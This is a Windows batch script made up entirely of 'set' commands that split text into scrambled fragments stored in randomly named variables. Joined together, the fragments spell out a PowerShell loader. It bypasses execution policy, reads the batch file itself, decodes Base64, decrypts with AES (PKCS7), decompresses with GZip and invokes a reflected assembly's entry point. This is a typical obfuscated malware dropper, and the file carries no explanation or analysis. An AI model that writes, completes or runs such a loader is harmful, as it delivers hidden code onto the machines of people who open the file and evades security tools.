@echo off
set "gflAPfFcKQ=ay()"
set "PrnaWtLjGI=tion"
set "gbgWdoYGzZ=);$f"
set "IqNEFVIVaN=);$I"
set "iCxdlyVdyx=saBm"
set "uTtoDkancS=ert]"
set "vHouQPJtEk=gjYA"
set "XeuhLXwzWZ=-Obj"
set "COWXnrXIrX=tem."
set "fEUCOjoMmL=YxVw"
set "ThuvCZbxJn=trea"
set "vslYZuvyab=Conv"
set "kOekonOgqW=.Dis"
set "xEqeZGkqFM=pher"
set "RkIiKHmoGL=('da"
set "XGDZjqCsdL=rt]:"
set "gdKdBZdane=$HhX"
set "xGALtKCYmW=ateD"
set "zKOMDzROAR=morF"
set "koompWFagM=('Tg"
set "reaknvUNmH=.Cre"
set "IGMNPZLHCp=ct S"
set "riyVMqkQNs=y.Pa"
set "LWrUECBlps=16] "
set "wBsxjAcTjm=[Env"
set "wIauJmjkGp= if "
set "AKrDHbTAxB=y.Ci"
set "AoMkypYPja=ypto"
set "GQqjJpUuoC=th('"
set "oEICEpCbVx== $f"
set "aePQNJQiZL=ddin"
set "XRKgCuEQjX=.Len"
set "AGRAKQvYlQ=-4] "
set "qgsIYazzpX=.IO."
set "bhnvcOoMaw=mqgg"
set "UVloqgqNHb=]::("
set "HvxkPNowMp=iron"
set "cKhQPYgGay=PxEW"
set "VIhwJRqgRU=eam("
set "CdgzmQyQTb=[IO."
set "DkytYJnBuR=[-1."
set "yxPmiezoQy='txe"
set "KyWYQSDOQi=();$"
set "SUsPyoZwKq=G) {"
set "JizrENHXgj=ress"
set "qJUwehYPrQ=] -j"
set "eGYaIeTHla=:('g"
set "rexDCnkOAA=crFF"
set "ULQPINHjez=gMod"
set "eUoAAnkVyd=DEeT"
set "bOlRHPIzFW=in $"
set "wkNeLQJzuf= = ["
set "adhWyUhQuN=embl"
set "IicarCsJrd=HDVw"
set "xxRuUnUDOE=XGg "
set "PSbAHKWcQL= = N"
set "vGvaygKXxC=Zays"
set "XdGdvJjyKL=e = "
set "OkOsqVeiDs=[Sys"
set "gJEJksTVQi=d;$f"
set "KwSrjYeWgh=ddin"
set "dPUwjGhFBs=Stre"
set "JdROTXPFon=u.Su"
set "eUehBxmHCb=onve"
set "OFXVzXvPCk=n ''"
set "zISUCIjqsy=g = "
set "nYKleltiQQ= '')"
set "mUOSGzpKft=-1.."
set "ZGBJBKEWRH=m.IO"
set "awqShGSwfE=raph"
set "aPMEgZNpoA=Comp"
set "KtLvkGbNIo=oArr"
set "ROpfadnitE=ect "
set "QNRnzEIxZX=:: '"
set "xybhhHXmAO=yste"
set "KBVAWhIHCT=rtS4"
set "iCMWJirJvJ=ehb "
set "WqChieFhsn=JK.I"
set "vciPUEULoM=, (,"
set "TVtOeqekid=.Cry"
set "EFvCfPVzYY=orF'"
set "uMgagWGCRc=[Sys"
set "CNlETJcjUK=Invo"
set "wSIXEuDtBj=V = "
set "hnimjhtrQE=-ep "
set "GzqfTpRRIF=.Com"
set "bcMGjnaGps=t Sy"
set "zCytqvSBtC=mb.T"
set "QyAYPNVswe=le  "
set "dvvXuISfcz=3); "
set "bubofzWtvC=($cr"
set "qJGzezjMnr=esaB"
set "EnetXOnNrW=fore"
set "zimFTYhQEt='gni"
set "NiqIXydZAt=$jmq"
set "VidIfWIzLA=XGg."
set "BFYIfHAwzM=uHmb"
set "sBjmlPsehk=)($H"
set "bwQYnZWAXL=y]::"
set "qOvFJCChGx=Disp"
set "QJFoeCvFis=m.IO"
set "pqNBbmpVsv=)))"
set "iQnrmjDyoj=ptor"
set "BdfFqIvsFl=$iuH"
set "EIrdOBAnsp=('%~f0'"
set "VrJBNVujpi=.Cop"
set "RPfDOCrVnw=zHhH"
set "IrdpOaZdSf=stem"
set "xsrgSLUBOq=em.C"
set "TUgwjsKerL=ach "
set "KJYrXgllbb='[-1"
set "bBveezRRjv=bypa"
set "sNiVenHWiu=esMa"
set "baaCaDdSSZ=CFxo"
set "SMigUsjopH===')"
set "umQzQjUFpt=).Sp"
set "UMJXxIvIud=tS46"
set "NtFnUUFEDi=, $H"
set "OiaKlDoeCO=Bmor"
set "pJVrjwDngF=::De"
set "xoylMzvztp=DVwc"
set "zuZRLyANuP=e]::"
set "SwleCpmehh=rofi"
set "PksYYJgiNu=ose("
set "lXNSopZRWr=[]] "
set "lSXOztZuVr= [Sy"
set "GZIgfkFWJl=ptog"
set "FcFKsgFznp=ion."
set "xeMBfekMTv=O.Me"
set "ZeVCznLwxK= '')"
set "auXuKqIwXc=c, 0"
set "ViKeblNsTJ=nirt"
set "NusxGROsWB=S46e"
set "sfStIzQMWG=HDVw"
set "XOgiFMWLHk=;$Hh"
set "nUfKIzmfKe=wc ="
set "NumhFTkVfT=yste"
set "ntXCSaxLXn=ing("
set "GedFgjtBzc=uuJK"
set "INHYoUzatd=tryP"
set "wQySqPXREv=Fina"
set "EtpMcbtajR=ress"
set "RGhCtHLoCY=join"
set "ORoonGfykZ=ecry"
set "puIGwVRIKK=y.Cr"
set "aOjrkCqwva=PKCS"
set "mgYVcxFwCs=pose"
set "idOjLgByEf=.Key"
set "LBVKhwUHFz=Syst"
set "pTZJBFWVLn=.Mod"
set "xVcENLArpK=gnir"
set "dfOiRZIzjF=tem."
set "NVHaiDZQub=flec"
set "jMYAgzFGGN=$dxP"
set "GDCZaLJcLp=uuJK"
set "VpuXYXeeeC=oin "
set "CPvjsdZkST=ress"
set "XhaRxzMpeM=gsYZ"
set "IzPAbaAElw==');"
set "GPdWcUbJZn=Obje"
set "SDfOgcOjbn=-joi"
set "CcfnzwflTB=BC;$"
set "sRCHTYlBPt=rans"
set "NLaUCUEIBX=mb ="
set "mqoOCbOEHp=WOeh"
set "WEkBJHWvYj=New-"
set "ulUhAwfTKn=$iuH"
set "WUnDfocwUq=and "
set "dCeoVJPEjq=yTo("
set "GFXevtnlyJ=6esa"
set "qzyLHdYUIN=Gg.T"
set "MtYnyyIpzH=ays."
set "xHPyiNdRds=ode]"
set "pwDmyGsiyk=c = "
set "WHuWrjKCAP=ose("
set "YueJfJMrUi=.Cry"
set "nmeFLGJYpe=106u"
set "pGCqrWZnpa=eMVs"
set "mnrGWNoCAo=..-1"
set "EREdBtQmMo=..-1"
set "ZDCcMZVFGk=  $s"
set "eMpofqlJYS=[Sys"
set "qTclSFnZUu=comm"
set "ZKDJbKwBar=gg.D"
set "MJUVxCLCId= = $"
set "CuhHKyKuzX=urit"
set "mDFRIeoYUu=Secu"
set "ZACnhDMhsU= [st"
set "slGhGWgUcp=);$i"
set "GpXMEjlPoy=IUkg"
set "ipSdkGgOno=RmAx"
set "pAKJRtKGSC=.-16"
set "wwtUAesHxw=oint"
set "ajkGECelBz=Mode"
set "IMlPmKBOMN=('%*'"
set "shUccQmViB=)($s"
set "kdcUrcyfwb=null"
set "IzoeWzIAao=rity"
set "SVizKIVLJn=::('"
set "QlOpAYpDdr=Star"
set "wSsadpySLr=g = "
set "zFmDSYhVnS=.GZi"
set "GgnjJERJlr=raph"
set "zIsdyMRLhB=comp"
set "HcPoQNkgKh=PTtG"
set "HaesIdhdOj=Comp"
set "qmfLusKfBO=DVwc"
set "WFqIinJpmB=PVq."
set "CxDkClUljc=se()"
set "SGwjUciBVj=bjec"
set "tggdZDWPPQ=ment"
set "QPQDqamlac=yste"
set "GgOFfhwvtt=FFu."
